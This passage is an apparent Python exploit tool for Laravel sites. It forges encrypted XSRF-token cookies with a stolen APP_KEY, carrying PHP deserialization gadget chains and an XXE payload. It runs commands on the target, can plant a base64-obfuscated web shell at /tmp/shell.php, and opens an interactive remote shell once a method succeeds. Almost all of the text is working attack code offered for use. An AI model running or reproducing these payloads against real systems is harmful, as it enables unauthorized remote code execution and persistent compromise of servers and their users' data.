        cmd = f"proc_open('bash -c \"{cmd}\"', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes) 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 14:
        cmd = f"file_put_contents('/tmp/shell.php', '<?php eval(base64_decode(\\'{base64.b64encode('system($_GET[cmd]);'.encode()).decode()}\\')); ?>')"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 15:
        cmd = f"eval('{cmd}')"
        payload_decoded = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=eval://' + cmd + '">]><root>&xxe;</root>'
    elif method == 16:
        cmd = f"system(base64_decode('{base64.b64encode(cmd.encode()).decode()}')) 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 17:
        payload_decoded = 'O:8:"stdClass":1:{s:3:"run";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    if verbose:
        console.print(f"[bold bright_yellow]üì¶ Payload Type: [cyan]{payload_type}[/cyan][/bold bright_yellow]")
    value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
    key = base64.b64decode(key)
    if verbose:
        console.print(f"[bold bright_yellow]üîí Encoded: [white]{value[:50]}...[/white][/bold bright_yellow]")
    return encrypt(value, key, verbose)

def encrypt(text, key, verbose=False):
    cipher = AES.new(key, AES.MODE_CBC)
    value = cipher.encrypt(pad(base64.b64decode(text), AES.block_size))
    payload = base64.b64encode(value)
    iv_base64 = base64.b64encode(cipher.iv)
    hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
    data = {'iv': iv_base64.decode(), 'value': payload.decode(), 'mac': hashed_mac}
    if verbose:
        console.print(f"[bold bright_yellow]üîê Encrypted: [white]{payload.decode()[:50]}...[/white][/bold bright_yellow]")
        console.print(f"[bold bright_yellow]üîë IV: [white]{iv_base64.decode()}[/white], MAC: [white]{hashed_mac[:20]}...[/white][/bold bright_yellow]")
    return base64.b64encode(json.dumps(data).encode()).decode()

def extractResponse(resp):
    return resp.split('<!DOCTYPE html>')[0]

def key_handler(signal_received, frame):
    console.print("[bold bright_red]üëã Exiting... Stay safe! üëã[/bold bright_red]")
    exit(0)

def exploit(url, api_key, cmd, method=1, verbose=False):
    payload = generate_payload(cmd, api_key, method, verbose)
    if verbose:
        console.print(f"[bold bright_cyan]üì° Sending Request:[/bold bright_cyan]")
        console.print(f"[yellow]  Target: [white]{url}[/white][/yellow]")
        console.print(f"[yellow]  Payload: [white]{payload[:50]}...[/white][/yellow]")
    try:
        response = requests.post(url, headers={'X-XSRF-TOKEN': payload}, timeout=10, verify=not args.skip_ssl)
        if verbose:
            console.print(f"[bold bright_blue]  Status: [white]{response.status_code}[/white][/bold bright_blue]")
            console.print(f"[bold bright_blue]  Response Preview: [white]{response.text[:200]}...[/white][/bold bright_blue]\n")
        return response
    except requests.RequestException as e:
        if verbose:
            console.print(f"[bold bright_red]  Error: [white]{str(e)}[/white][/bold bright_red]\n")
        raise

def main():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument('URL', help="Laravel website URL to attack")
    parser.add_argument('API_KEY', help="Laravel website APP_KEY (base64)")
    parser.add_argument('-c', '--command', default='uname -a', help="Command to execute")
    parser.add_argument('-m', '--method', type=int, choices=range(1, 18), default=1, help="Payload method (1-17)")
    parser.add_argument('-i', '--interactive', action="store_true", help="Interactive shell")
    parser.add_argument('-v', '--verbose', action="store_true", help="Enable verbose output")
    parser.add_argument('-a', '--all', action="store_true", help="Test all payload methods")
    parser.add_argument('--skip-ssl', action="store_true", help="Skip SSL verification")
    args = parser.parse_args()

    console.print(banner)
    display_warnings()
    console.print("[bold bright_cyan]üî• LaraExploit Ready! üí•[/bold bright_cyan]\n")

    if args.verbose:
        console.print(f"[bold bright_yellow]‚ö° Verbose Mode: [italic white]URL: {args.URL}, Command: {args.command}[/italic white][/bold bright_yellow]\n")

    # Custom spinners for each method
    spinners = ['dots', 'bouncingBar', 'arc', 'triangle', 'dots12', 'simpleDots', 'line', 'point', 'star', 'star2', 'flip', 'hamburger', 'growVertical', 'bounce', 'dots8Bit', 'aesthetic', 'bounce']

    if args.all:
        console.print("[bold bright_cyan]üå© Testing All Payloads (Methods 1-17) üå©[/bold bright_cyan]")
        console.print("[bold bright_yellow]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï° Payloads ‚ïû‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold bright_yellow]\n")
        vulnerable_methods = []
        results_table = Table(title="[bold bright_cyan]üéØ Payload Results üõ†[/bold bright_cyan]", show_header=True, header_style="bold bright_yellow", border_style="bright_cyan")
        results_table.add_column("Method", style="cyan", justify="center")
        results_table.add_column("Status", style="yellow", justify="center")
        results_table.add_column("Output", style="white")

        for method in range(1, 18):
            console.print(f"[bold bright_yellow]üî• Method {method} Initiated üí•[/bold bright_yellow]")
            with Progress(SpinnerColumn(spinner_name=spinners[method-1]), TextColumn("[cyan]‚ö° Connecting...[/cyan]"), BarColumn(), transient=True) as progress:
                task = progress.add_task("", total=100)
                for i in range(100):
                    progress.update(task, advance=1)
                    time.sleep(0.02)
                try:
                    resp = exploit(args.URL, args.API_KEY, args.command, method, args.verbose)
                    status_code = resp.status_code
                    console.print(f"[bold bright_green]‚úÖ Connected (Status: {status_code})[/bold bright_green]")
                except Exception as e:
                    console.print(f"[bold bright_red]‚ùå Failed: {e}[/bold bright_red]")
                    results_table.add_row(str(method), "[bold bright_red]‚ùå Failed[/bold bright_red]", str(e))
                    console.print("")
                    continue

            console.print(f"[bold bright_cyan]üîë APP_KEY: [yellow]{args.API_KEY[:20]}********[/yellow]")
            if any(x in resp.text for x in ["Linux", "www-data", "shell.php", "uid=", "gid="]):
                console.print(f"[bold bright_green]‚úÖ Method {method} is [underline]VULNERABLE[/underline]! üéâ[/bold bright_green]")
                output = extractResponse(resp.text)
                results_table.add_row(str(method), "[bold bright_green]‚úÖ Vulnerable[/bold bright_green]", output[:50] + "..." if len(output) > 50 else output)
                vulnerable_methods.append(method)
            else:
                console.print(f"[bold bright_red]‚ùå Method {method} is not vulnerable.[/bold bright_red]")
                results_table.add_row(str(method), "[bold bright_red]‚ùå Not Vulnerable[/bold bright_red]", "-")
            console.print("")

        console.print(results_table)
        console.print("[bold bright_yellow]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï° Summary ‚ïû‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold bright_yellow]\n")

        if vulnerable_methods:
            console.print(f"[bold bright_green]üéâ Vulnerable Methods: {vulnerable_methods} üéâ[/bold bright_green]")
            if args.interactive:
                console.print(f"[bold bright_yellow]üíª Starting RCE Shell with Method {vulnerable_methods[0]} üíª[/bold bright_yellow]")
                console.print(f"[bold bright_yellow]‚ö° Interactive Mode - Press CTRL+C to exit ‚ö°[/bold bright_yellow]")
                console.print("[bold bright_cyan]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï° Shell ‚ïû‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold bright_cyan]\n")
                signal(SIGINT, key_handler)
                while True:
                    cmd = console.input("[bold bright_green]‚û§ [/bold bright_green]")
                    if len(cmd) == 0:
                        continue
                    resp = exploit(args.URL, args.API_KEY, cmd, vulnerable_methods[0], args.verbose)
                    console.print(f"[white]{extractResponse(resp.text)}[/white]\n")
        else:
            try:
                console.print("[bold bright_red]‚ùå No vulnerable methods found.[/bold bright_red]")
            except Exception:
                console.print("‚ùå No vulnerable methods found.")
        return

    # Normal mode (single method)
    console.print(f"[bold bright_yellow]üî• Testing Method {args.method} üí•[/bold bright_yellow]")
    with Progress(SpinnerColumn(spinner_name="dots"), TextColumn("[cyan]‚ö° Connecting...[/cyan]"), BarColumn(), transient=True) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            progress.update(task, advance=1)
            time.sleep(0.02)
        try:
            resp = exploit(args.URL, args.API_KEY, args.command, args.method, args.verbose)
            status_code = resp.status_code
            console.print(f"[bold bright_green]‚úÖ Connected (Status: {status_code})[/bold bright_green]")
        except Exception as e:
            console.print(f"[bold bright_red]‚ùå Failed: {e}[/bold bright_red]")
            return

    console.print(f"[bold bright_cyan]üîë APP_KEY: [yellow]{args.API_KEY[:20]}********[/yellow]\n")
    if any(x in resp.text for x in ["Linux", "www-data", "shell.php", "uid=", "gid="]):
        console.print(f"[bold bright_green]‚úÖ Method {args.method} is [underline]VULNERABLE[/underline]! üéâ[/bold bright_green]")
        console.print(f"[white]{extractResponse(resp.text)}[/white]\n")
    else:
        console.print(f"[bold bright_red]‚ùå Method {args.method} is not vulnerable.[/bold bright_red]")
        return

    if args.interactive:
        console.print(f"[bold bright_yellow]‚ö° Interactive Mode - Press CTRL+C to exit ‚ö°[/bold bright_yellow]")
        console.print("[bold bright_cyan]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï° Shell ‚ïû‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold bright_cyan]\n")
        signal(SIGINT, key_handler)
        while True:
            cmd = console.input("[bold bright_green]‚û§ [/bold bright_green]")
            if len(cmd) == 0:
                continue
            resp = exploit(args.URL, args.API_KEY, cmd, args.method, args.verbose)
            console.print(f"[white]{extractResponse(resp.text)}[/white]\n")

main()
